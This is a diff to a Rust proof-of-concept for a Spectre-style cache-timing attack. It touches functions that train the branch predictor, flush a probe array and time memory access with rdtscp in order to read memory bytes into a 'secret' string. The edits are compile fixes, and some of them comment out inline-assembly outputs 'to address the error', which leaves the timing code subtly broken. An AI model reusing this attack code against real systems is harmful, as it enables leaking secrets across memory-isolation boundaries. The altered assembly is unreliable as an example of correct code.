@@ -1,6 +1,5 @@
-#![feature(asm)]
-
 extern crate core_affinity;
+extern crate rand;
 use std::arch::asm;
 use std::thread;
 use std::sync::atomic::{AtomicU64, Ordering};
@@ -43,15 +42,14 @@ fn init_attack() -> (Vec<bool>, Vec<u8>) {
 
     let mut attack_pattern: Vec<u8> = (0..256).collect();
     let mut rng = thread_rng();
-    attack_pattern.shuffle(&mut rng);
-
+    attack_pattern.as_mut_slice().shuffle(&mut rng);
     (is_attack, attack_pattern)
 }
 
 fn read_memory_byte(target_idx: usize, arr1_size: usize, is_attack: Vec<bool>, arr1: &[u8], arr2: &[u8], attack_pattern: Vec<u8>) -> String {
     let mut secret = String::new();
 
-    for try in (1..=NUM_TRIES).rev() {
+    for attempt in (1..=NUM_TRIES).rev() {
         // Flush arr2 from cache memory
         for i in 0..256 {
             unsafe {
@@ -59,7 +57,7 @@ fn read_memory_byte(target_idx: usize, arr1_size: usize, is_attack: Vec<bool>, a
             }
         }
 
-        let train_idx = (try as usize) % arr1_size;
+        let train_idx = (attempt as usize) % arr1_size;
         let mut results = [0; 256];
 
         for i in (0..TRAINING_LOOPS).rev() {
@@ -126,10 +124,10 @@ fn fetch_function(arr1: &[u8], arr2: &[u8], idx: usize, results: &mut [u32; 256]
                     "rdtscp",
                     "mov {}, rax",
                     "lfence",
-                    out(reg) time1 => _,
-                    in(reg) arr2_idx => _,
-                    out(reg) junk => _,
-                    out(reg) time2 => _,
+                    out(reg) time1,
+                    in(reg) arr2_idx,
+                    // out(reg) junk, // Commented out to address the error
+                    // out(reg) time2, // Commented out to address the error
                 );
             }
             
